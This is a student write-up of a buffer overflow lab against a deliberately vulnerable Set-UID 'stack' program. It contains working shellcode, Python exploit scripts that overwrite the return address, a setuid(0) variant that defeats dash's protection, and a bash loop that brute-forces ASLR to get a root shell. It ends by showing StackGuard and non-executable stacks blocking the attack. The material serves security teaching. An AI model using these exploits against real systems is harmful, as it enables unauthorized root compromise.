# Lab 6 - Buffer Overflow

## Task 1: Running Shellcode

Make sure the `call_shellcode` works:

```console
$ gcc -z execstack -o call_shellcode call_shellcode.c
call_shellcode.c: In function ‘main’:
call_shellcode.c:24:4: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
    strcpy(buf, code);
    ^
call_shellcode.c:24:4: warning: incompatible implicit declaration of built-in function ‘strcpy’
call_shellcode.c:24:4: note: include ‘<string.h>’ or provide a declaration of ‘strcpy’
$ ./call_shellcode
#
```

Create the `stack` executable, change ownership to `root` user, and enable `Set-UID` bit:

```console
$ gcc -DBUF_SIZE=30 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

Test that everything works:

```console
$ head -c 40 /dev/urandom > badfile
$ ./stack
Returned Properly
$ head -c 36 /dev/urandom > badfile
$ ./stack
Returned Properly
$ head -c 360 /dev/urandom > badfile
$ ./stack
Segmentation fault
```

We can see that some extra bytes are added to the stack, but as soon as we try with a large badfile, we get a segmentation fault.

## Task 2: Exploiting the vulnerability

The vulnerability program `exlpoit.c` is designed to create a malicious `badfile`. However, it needs some tweaking or the resulting badfile will most probably end up with a segmentation fault. Most important

```console
$ gdb -q stack
Reading symbols from stack...done.
gdb-peda$ b bof
Breakpoint 1 at 0x80484f1: file stack.c, line 21.
gdb-peda$ r
[----------------------------------registers-----------------------------------]
EAX: 0xbfffea57 --> 0x29ea4990
EBX: 0x0
ECX: 0x804b0a0 --> 0x0
EDX: 0x0
ESI: 0xb7fba000 --> 0x1b1db0
EDI: 0xb7fba000 --> 0x1b1db0
EBP: 0xbfffea18 --> 0xbfffec68 --> 0x0
ESP: 0xbfffe9f0 --> 0xb7fe96eb (<_dl_fixup+11>:	add    esi,0x15915)
EIP: 0x80484f1 (<bof+6>:	sub    esp,0x8)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484eb <bof>:	push   ebp
   0x80484ec <bof+1>:	mov    ebp,esp
   0x80484ee <bof+3>:	sub    esp,0x28
=> 0x80484f1 <bof+6>:	sub    esp,0x8
   0x80484f4 <bof+9>:	push   DWORD PTR [ebp+0x8]
   0x80484f7 <bof+12>:	lea    eax,[ebp-0x26]
   0x80484fa <bof+15>:	push   eax
   0x80484fb <bof+16>:	call   0x8048390 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xbfffe9f0 --> 0xb7fe96eb (<_dl_fixup+11>:	add    esi,0x15915)
0004| 0xbfffe9f4 --> 0x0
0008| 0xbfffe9f8 --> 0xb7fba000 --> 0x1b1db0
0012| 0xbfffe9fc --> 0xb7ffd940 (0xb7ffd940)
0016| 0xbfffea00 --> 0xbfffec68 --> 0x0
0020| 0xbfffea04 --> 0xb7feff10 (<_dl_runtime_resolve+16>:	pop    edx)
0024| 0xbfffea08 --> 0xb7e6688b (<__GI__IO_fread+11>:	add    ebx,0x153775)
0028| 0xbfffea0c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xbfffea57 "\220I\352)\301v3\230)`\356*\276g\025\025\372\304b\002a\257\253\023\300\212\242\022\301̽\003ׂ\225\307υ\254\v\300\031\001\333.Q\024\264\222\237\005Ex3\342ZQC\004\377/̙Q\262\256\357\340Π\305\377\vH\275\320i!\r\310\323ԩ\304\016_\f\"\370\226\217\255\347@8l\311=\202\267\346\f\273\034'\025$!z]\023\277\340\215\351\374\347l{\024\356\253\307Y\001!\214yx\254\350\320Ӡ\250UJ\345ѱ\314s+V,\316\366'\037\211\201\204\004u\367Y\230\201") at stack.c:21
21	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xbfffea18
gdb-peda$ p &buffer
$2 = (char (*)[30]) 0xbfffe9f2
gdb-peda$ quit
```

First we calculate the offset between the pointer `$ebp` and the buffer. And also add some random value to the `$ebp` that does not result in any zero byte (since that would cancel the string copy early).

```console
$ printf "%d\n" $((0xbfffea18 - 0xbfffe9f2))
38
$ printf "0x%X\n" $((0xbfffea18 + 100))
0xBFFFEA7C
```

```python
#!/usr/bin/python3
import sys

shellcode= (
   "\x31\xc0"    # xorl    %eax,%eax
   "\x50"        # pushl   %eax
   "\x68""//sh"  # pushl   $0x68732f2f
   "\x68""/bin"  # pushl   $0x6e69622f
   "\x89\xe3"    # movl    %esp,%ebx
   "\x50"        # pushl   %eax
   "\x53"        # pushl   %ebx
   "\x89\xe1"    # movl    %esp,%ecx
   "\x99"        # cdq
   "\xb0\x0b"    # movb    $0x0b,%al
   "\xcd\x80"    # int     $0x80
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode

##### Change the ret and offset values to the correct ones! #####
#################################################################
ret    = 0xbfffea18 + 100      # 0xbfffea7c
offset = 38 + 4                # 0xbfffea18 - 0xbfffe9f2 (as dec) + 4

content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
#################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

```console
seed@VM$ exploit.py
seed@VM$ ./stack
# whoami
root
```

## Task 3: Defeating `dash`'s Countermeasure

Reset the symbolic for `sh` from `zsh` to `dash`. Observe the user is not `root`:

```console
seed@VM$ sudo ln -sf /bin/dash /bin/sh
seed@VM$ ./stack
$ whoami
seed
```

Modify the exploit script to invoke the `seuid(0)` in the shellcode before the `execve()` invocation:

```python
#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0" # Line 1: xorl %eax,%eax */
  "\x31\xdb" # Line 2: xorl %ebx,%ebx */
  "\xb0\xd5" # Line 3: movb $0xd5,%al */
  "\xcd\x80" # Line 4: int $0x80 */
  "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80"
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode

##################################################################
ret    = 0xbfffea18 + 100       # 0xbfffea7c
offset = 38 + 4                 # 0xbfffea18 - 0xbfffe9f2 (as dec)

content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Generate a new badfile and make sure we are `root` again:

```console
seed@VM:$ exploit.py
seed@VM:$ ./stack
# whoami
root
```

## Task 4: Defeating Address Randomization

Enable address randomization again:

```console
$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
kernel.randomize_va_space=2
$ ./stack
Segmentation fault
```

We now get a Swgmentation Fault due to the address randomization. This can be brute forced until success with a simple script written in i.e. bash:

```sh
#!/bin/bash

SECONDS=0
value=0

while [ 1 ]
    do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    echo "$min minutes and $sec seconds elapsed."
    echo "The program has been running $value times so far."
    ./stack
done
```

Run for a while until we once again gain a root shell:

```console
$ sudo chmod +x loop-script.sh
$ ./loop-script.sh
[...]
./loop-script.sh: line 15:  1535 Segmentation fault      ./stack
0 minutes and 30 seconds elapsed.
The program has been running 17334 times so far.
# whoami
root
```

## Task 5: Turn on the StackGuard Protection

Turn off the address randomization again, compile `stack.c` from task 1 without `-fno-stack-protector`:

```console
$ sudo sysctl -w kernel.randomize_va_space=0
$ ./stack
*** stack smashing detected ***: ./stack terminated
Aborted
```

## Task 6: Turn on the Non-executable Stack Protection

```console
gcc -o stack -z noexecstack -fno-stack-protector stack.c
$ ./stack
Segmentation fault
```
